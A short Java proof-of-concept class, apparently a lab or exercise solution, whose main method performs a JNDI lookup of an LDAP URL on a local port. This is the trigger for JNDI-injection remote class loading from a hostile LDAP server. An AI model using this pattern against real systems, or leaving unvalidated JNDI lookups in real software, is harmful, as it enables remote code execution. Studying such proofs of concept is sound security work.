package com.example.solution;

import com.alibaba.druid.pool.DruidDataSource;

import javax.naming.InitialContext;
import javax.naming.NamingException;

public class Poc {
    public static void main(String[] args) throws NamingException {
        InitialContext initialContext = new InitialContext();
        String url = "ldap://127.0.0.1:50389/e6b461";
        Object lookup = initialContext.lookup(url);
    }
}
